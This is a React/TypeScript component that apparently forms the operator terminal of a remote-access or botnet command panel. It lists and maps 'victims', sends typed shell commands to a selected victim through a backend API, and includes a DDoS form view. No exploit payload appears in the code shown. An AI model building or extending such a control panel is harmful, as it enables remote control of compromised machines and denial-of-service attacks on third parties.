import React, { useState, useEffect, useRef } from 'react';
import Split from 'react-split';
import { Map, BarChart3, Terminal as TerminalIcon, ComputerIcon } from 'lucide-react';
import { useUserStore } from '@/Stores/UserStore';
import { executeCommand, initializeModules, getModules } from '@/Modules/commandRegistry';
import { Autocomplete } from './Autocomplete';
import GraphicalActions from './GraphicalActions';
import VictimMap from './VictimMap';
import DetailedStats from './DetailedStats';
import { DDOSForm } from './DDOSForm';

type ViewType = 'map' | 'stats' | 'actions' | 'computer';

export const Terminal: React.FC = () => {
  const { selectedUser, users } = useUserStore();
  const [input, setInput] = useState('');
  const [output, setOutput] = useState<string[]>([]);
  const [isFocused, setIsFocused] = useState(false);
  const [position, setPosition] = useState({ top: 0, left: 0 });
  const inputRef = useRef<HTMLInputElement>(null);
  const [modules, setModules] = useState<Record<string, any>>({});
  const outputRef = useRef<HTMLDivElement | null>(null);
  const [history, setHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState<number>(-1);
  const [isAutocompleteVisible, setIsAutocompleteVisible] = useState(false);
  const [currentView, setCurrentView] = useState<ViewType>('map');

  // ViewSwitcher Component
  const ViewSwitcher = () => {
    const views = [
      { id: 'map' as ViewType, icon: <Map size={20} />, name: 'Map View' },
      { id: 'stats' as ViewType, icon: <BarChart3 size={20} />, name: 'Statistics' },
      { id: 'actions' as ViewType, icon: <TerminalIcon size={20} />, name: 'Actions' },
      { id: 'computer' as ViewType, icon: <ComputerIcon size={20} />, name: 'Computer' },
    ];

    return (
      <div className="bg-gray-700/50 p-1.5 rounded-lg flex justify-center mb-4">
        <div className="inline-flex rounded-md bg-gray-800/50 p-1 gap-1">
          {views.map((view) => (
            <button
              key={view.id}
              id={"button-"+view.id}
              onClick={() => setCurrentView(view.id)}
              className={`
                flex items-center px-3 py-1.5 rounded
                transition-all duration-200 ease-in-out
                ${currentView === view.id 
                  ? 'bg-blue-500 text-white shadow-lg' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-700'}
              `}
              title={view.name}
            >
              {view.icon}
            </button>
          ))}
        </div>
      </div>
    );
  };

  useEffect(() => {
    initializeModules();
    const loadedModules = getModules();
    setModules(loadedModules);
  }, []);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  // Your existing handlers (handleInputChange, handleKeyDown, etc.)...
  const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    setInput(event.target.value);
    if (event.target.value.startsWith('/')) {
      setIsAutocompleteVisible(true);
    }
    updatePosition();
  };

  const updatePosition = () => {
    if (inputRef.current) {
      const rect = inputRef.current.getBoundingClientRect();
      setPosition({ top: rect.top, left: rect.left });
    }
  };

  const handleAutocompleteSelect = (suggestion: string) => {
    const parts = input.split('/');
    if (parts.length <= 2) {
      setInput(`/${suggestion}/`);
    } else {
      parts[parts.length - 1] = suggestion;
      setInput(parts.join('/'));
    }
  };

  const handleKeyDown = async (event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === 'Escape' && isAutocompleteVisible) {
      setIsAutocompleteVisible(false);
      return;
    }

    if (!isAutocompleteVisible) {
      if (event.key === 'ArrowUp') {
        event.preventDefault();
        if (history.length === 0) return;

        if (historyIndex === -1) {
          setHistoryIndex(history.length - 1);
          setInput(history[history.length - 1]);
        } else if (historyIndex > 0) {
          setHistoryIndex(historyIndex - 1);
          setInput(history[historyIndex - 1]);
        }
        return;
      }

      if (event.key === 'ArrowDown') {
        event.preventDefault();
        if (historyIndex === -1) return;

        if (historyIndex < history.length - 1) {
          setHistoryIndex(historyIndex + 1);
          setInput(history[historyIndex + 1]);
        } else {
          setHistoryIndex(-1);
          setInput('');
        }
        return;
      }
    }

    if (event.key === 'Enter') {
      const trimmedInput = input.trim();
      if (trimmedInput) {
        setHistory((prev) => [...prev, trimmedInput]);
        setHistoryIndex(-1);
        setIsAutocompleteVisible(false);

        if (trimmedInput === 'clear') {
          setOutput([]);
          setInput('');
          return;
        }

        addOutput(`> ${trimmedInput}`);
        if (trimmedInput.startsWith('/')) {
          executeCommand(selectedUser!, trimmedInput, addOutput); // Use selected user from store
        } else {
          try {
            const response = await fetch('http://localhost:8000/api/shell', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ command: trimmedInput, id: selectedUser?.uuid }),
            });

            if (!response.ok) {
              const errorData = await response.json();
              throw new Error(`${errorData.detail || 'Unknown error'}`);
            }

            const data = await response.json();
            addOutput(data.output);
          } catch (error: any) {
            console.error('Error executing command:', error);
            addOutput('Error: ' + error.message);
          }
        }
        setInput('');
      }
    }
  };

  const addOutput = (message: string) => {
    setOutput((prev) => [...prev, message]);
  };

  const handleFocus = () => {
    setIsFocused(true);
    updatePosition();
  };

  const handleBlur = () => {
    setTimeout(() => {
      setIsFocused(false);
    }, 200);
  };

  if (!selectedUser) {
    return (
      <div className="h-full flex items-center justify-center">
        <p>No victim selected. Please select a victim from the list.</p>
      </div>
    );
  }

  const renderCurrentView = () => {
    switch (currentView) {
      case 'map':
        return <VictimMap defaultCenter={[selectedUser.longitude, selectedUser.latitude]}/>;
      case 'stats':
        return <DetailedStats />;
      case 'actions':
        return (
          <GraphicalActions
            selectedUser={selectedUser}
            addOutput={addOutput}
            setModules={setModules}
          />
        );
      case 'computer':
        return (<DDOSForm />);

      default:
        return null;
    }
  };

  return (
    <Split
      className="flex flex-col h-full"
      sizes={[40, 60]}
      minSize={100}
      gutterSize={10}
      gutterAlign="center"
      direction="vertical"
    >
      <div className="bg-gray-800 p-4 rounded-lg overflow-auto">
        <ViewSwitcher />
        <div className="h-[calc(100%-3rem)] overflow-auto">
          {renderCurrentView()}
        </div>
      </div>

      <div className="flex flex-col bg-gray-900 text-white p-4 rounded-lg space-y-2 flex-grow overflow-hidden">
        <div ref={outputRef} className="output h-full overflow-y-auto flex-grow">
          {output.map((line, index) => (
            <div key={index}>{line}</div>
          ))}
        </div>
        <div className="input flex items-center relative">
          <span className="mr-2">&gt;</span>
          <input
            id="terminal-input"
            ref={inputRef}
            className={`w-full bg-gray-700 text-white outline-none transition-colors p-3 rounded-lg cursor-pointer
              ${isFocused ? 'border-green-500' : 'border-green-700'} 
              hover:border-green-400 hover:bg-green-800`}
            value={input}
            onChange={handleInputChange}
            onKeyDown={handleKeyDown}
            onFocus={handleFocus}
            onBlur={handleBlur}
            placeholder="Type command..."
          />
          <Autocomplete
            input={input}
            modules={modules}
            onSelect={handleAutocompleteSelect}
            onEscape={() => setIsAutocompleteVisible(false)}
            position={position}
            inputRef={inputRef}
            isVisible={isAutocompleteVisible && input.startsWith('/')}
          />
        </div>
      </div>
    </Split>
  );
};

export default Terminal;